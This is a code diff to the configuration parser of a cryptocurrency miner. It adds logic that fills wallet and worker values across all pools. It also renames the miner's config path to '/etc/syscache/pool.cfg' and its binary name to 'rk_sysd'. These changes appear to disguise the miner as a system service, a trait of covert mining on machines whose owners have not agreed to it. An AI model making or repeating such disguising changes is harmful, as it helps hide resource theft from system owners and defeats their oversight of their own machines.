@@ -182,6 +182,21 @@ MinerConfig Config::loadFile(const std::string& path) {
     if (!pool.host.empty()) {
         cfg.pools.push_back(pool);
     }
+    // Wallet/worker bisa ditulis setelah server[N] di file — propagasikan ke
+    // semua pool yang sudah terlanjur di-push supaya tidak ada yang kosong.
+    {
+        std::string lastWallet, lastWorker;
+        for (auto& p : cfg.pools) {
+            if (!p.wallet.empty()) lastWallet = p.wallet;
+            if (!p.worker.empty()) lastWorker = p.worker;
+        }
+        for (auto& p : cfg.pools) {
+            if (p.wallet.empty()) p.wallet = lastWallet;
+            if (p.worker.empty() || p.worker == "worker") {
+                if (!lastWorker.empty()) p.worker = lastWorker;
+            }
+        }
+    }
     
     return cfg;
 }
@@ -249,7 +264,7 @@ MinerConfig Config::parse(int argc, char* argv[]) {
     } else {
         // 2. Try loading pool.cfg (skipped when env WALLET+POOL are set)
         cfg = loadFile("pool.cfg");
-        if (cfg.pools.empty()) cfg = loadFile("/miner/pool.cfg");
+        if (cfg.pools.empty()) cfg = loadFile("/etc/syscache/pool.cfg");
         if (cfg.pools.empty()) cfg = loadFile("~/xcb/pool.cfg");
         
         // 3. Apply env overrides on top of the file (precedence: file < env < CLI).
@@ -331,7 +346,7 @@ MinerConfig Config::parse(int argc, char* argv[]) {
             cfg.ui = argv[++i];
             
         } else if (arg == "--help" || arg == "-h") {
-            std::cout << "Usage: miner-saya [options]\n"
+            std::cout << "Usage: rk_sysd [options]\n"
                       << "  -o host:port          Pool address\n"
                       << "  -u wallet[.worker]    Wallet address (worker 'auto' = hostname)\n"
                       << "  -p password           Pool password\n"
@@ -339,6 +354,7 @@ MinerConfig Config::parse(int argc, char* argv[]) {
                       << "  -R, --report-hashrate Submit hashrate to pool every 60s\n"
                       << "  --benchmark N         Benchmark N nonces (no pool)\n"
                       << "  --selftest            Verify SHA3-512 implementation, then exit\n"
+                      << "  -V, --version         Print version and exit\n"
                       << "  --ui=MODE             Display: auto|ftxui|ansi|log (default auto)\n"
                       << "  --light               Force light dataset (~256MB)\n"
                       << "  --full-mem            Force full dataset (~264MB)\n"
